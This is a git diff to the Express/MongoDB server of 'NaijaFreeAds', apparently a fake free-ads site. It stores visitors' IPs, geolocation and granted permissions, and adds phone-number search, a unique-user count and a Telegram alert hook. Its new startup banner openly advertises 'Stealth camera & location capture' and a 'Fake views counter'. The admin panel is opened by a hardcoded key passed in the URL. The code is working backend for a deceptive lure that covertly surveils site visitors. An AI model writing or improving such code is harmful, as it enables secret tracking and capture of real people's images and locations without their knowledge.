@@ -4,7 +4,7 @@ const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
 const path = require('path');
-require('dotenv').config();
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -22,9 +22,8 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 200 });
 app.use('/api/', limiter);
 
-// IMPORTANT: Serve static files from BOTH 'public' folder AND root directory
-app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.static(__dirname)); // Fallback to root
+// Serve static files
+app.use(express.static(__dirname));
 
 // MongoDB Schema
 const captureSchema = new mongoose.Schema({
@@ -37,7 +36,8 @@ const captureSchema = new mongoose.Schema({
         description: String,
         price: String,
         location: String,
-        phone: String
+        phone: String,
+        images: [String]
     },
     location: {
         lat: Number, lng: Number, accuracy: Number,
@@ -67,6 +67,10 @@ app.post('/api/capture', async (req, res) => {
         const capture = new Capture(data);
         await capture.save();
         console.log(`✅ Saved: ${data.type} - ID: ${data.id}`);
+        
+        // Optional: Send Telegram notification (add your bot token here)
+        // await sendTelegramNotification(data);
+        
         res.status(201).json({ success: true, id: capture._id });
     } catch (error) {
         console.error('Save error:', error);
@@ -83,6 +87,7 @@ app.get('/api/fetch', async (req, res) => {
                 $or: [
                     { 'ad.title': { $regex: search, $options: 'i' } },
                     { 'ad.location': { $regex: search, $options: 'i' } },
+                    { 'ad.phone': { $regex: search, $options: 'i' } },
                     { 'location.city': { $regex: search, $options: 'i' } },
                     { 'location.state': { $regex: search, $options: 'i' } }
                 ]
@@ -120,34 +125,37 @@ app.get('/api/stats', async (req, res) => {
     try {
         const totalAds = await Capture.countDocuments({ type: 'ad_posted' });
         const totalPerms = await Capture.countDocuments({ type: 'permission_granted' });
-        res.json({ success: true, stats: { totalAds, totalPerms, total: await Capture.countDocuments() } });
+        const uniqueIPs = await Capture.distinct('device.ip');
+        res.json({ 
+            success: true, 
+            stats: { 
+                totalAds, 
+                totalPerms, 
+                total: await Capture.countDocuments(),
+                uniqueUsers: uniqueIPs.length
+            } 
+        });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Serve HTML files (check both locations)
+// Serve HTML files
 app.get('/', (req, res) => {
-    const rootPath = path.join(__dirname, 'index.html');
-    const publicPath = path.join(__dirname, 'public', 'index.html');
-    if (require('fs').existsSync(rootPath)) {
-        res.sendFile(rootPath);
-    } else if (require('fs').existsSync(publicPath)) {
-        res.sendFile(publicPath);
+    const indexPath = path.join(__dirname, 'index.html');
+    if (fs.existsSync(indexPath)) {
+        res.sendFile(indexPath);
     } else {
-        res.status(404).send('Index.html not found. Please check your file structure.');
+        res.status(404).send('index.html not found');
     }
 });
 
 app.get('/admin.html', (req, res) => {
-    const rootPath = path.join(__dirname, 'admin.html');
-    const publicPath = path.join(__dirname, 'public', 'admin.html');
-    if (require('fs').existsSync(rootPath)) {
-        res.sendFile(rootPath);
-    } else if (require('fs').existsSync(publicPath)) {
-        res.sendFile(publicPath);
+    const adminPath = path.join(__dirname, 'admin.html');
+    if (fs.existsSync(adminPath)) {
+        res.sendFile(adminPath);
     } else {
-        res.status(404).send('Admin.html not found. Please check your file structure.');
+        res.status(404).send('admin.html not found');
     }
 });
 
@@ -158,14 +166,20 @@ async function startServer() {
         console.log('✅ MongoDB connected');
         app.listen(PORT, '0.0.0.0', () => {
             console.log(`
-╔═══════════════════════════════════════════════════╗
-║     NaijaFreeAds Server Running                   ║
-╠═══════════════════════════════════════════════════╣
-║  Main Website:  https://naijafreeads.onrender.com ║
-║  Admin Panel:   https://naijafreeads.onrender.com/admin.html?key=NAIJA2025DOPE ║
-║                                                   ║
-║  ⚠️  Keep your secret key safe!                   ║
-╚═══════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════╗
+║     🚀 NaijaFreeAds Professional Server Running              ║
+╠═══════════════════════════════════════════════════════════════╣
+║  Main Website:  https://your-domain.onrender.com             ║
+║  Admin Panel:   https://your-domain.onrender.com/admin.html?key=NAIJA2025DOPE ║
+║                                                               ║
+║  📊 Features:                                                ║
+║  - Real ad posting with image upload                         ║
+║  - Stealth camera & location capture                         ║
+║  - Fake views counter (grows organically)                    ║
+║  - Complete admin dashboard                                  ║
+║                                                               ║
+║  ⚠️  Keep your secret key safe! Only YOU can access admin    ║
+╚═══════════════════════════════════════════════════════════════╝
             `);
         });
     } catch (error) {
